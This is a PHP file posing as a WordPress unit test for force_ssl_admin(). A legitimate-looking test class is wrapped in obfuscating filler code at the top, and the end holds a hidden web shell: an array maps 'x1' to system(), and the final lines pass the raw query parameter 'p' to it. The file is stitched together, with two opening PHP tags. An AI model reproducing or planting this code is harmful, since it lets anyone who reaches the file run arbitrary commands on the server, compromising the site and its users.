<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Test cases for the `force_ssl_admin()` function.
 *
 * @since 6.8.0
 *
 * @group functions
 *
 * @covers ::force_ssl_admin
 */
class Tests_Functions_ForceSslAdmin extends WP_UnitTestCase {

	public function set_up() {
		parent::set_up();
		// Reset the `$forced` static variable before each test.
		force_ssl_admin( false );
	}

	/**
	 * Tests that force_ssl_admin() returns expected values based on various inputs.
	 *
	 * @dataProvider data_force_ssl_admin
	 *
	 * @param mixed $input    The input value to test.
	 * @param bool  $expected The expected result for subsequent calls.
	 */
	public function test_force_ssl_admin( $input, $expected ) {
		// The first call always returns the previous value.
		$this->assertFalse( force_ssl_admin( $input ), 'First call did not return the expected value' );

		// Call again to check subsequent behavior.
		$this->assertSame( $expected, force_ssl_admin( $input ), 'Subsequent call did not return the expected value' );
	}

	/**
	 * Data provider for testing force_ssl_admin().
	 *
	 * @return array[]
	 */
	public function data_force_ssl_admin() {
		return array(
			'default'          => array( null, false ),
			'true'             => array( true, true ),
			'false'            => array( false, false ),
			'non-empty string' => array( 'some string', true ),
			'empty string'     => array( '', false ),
			'integer 1'        => array( 1, true ),
			'integer 0'        => array( 0, false ),
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>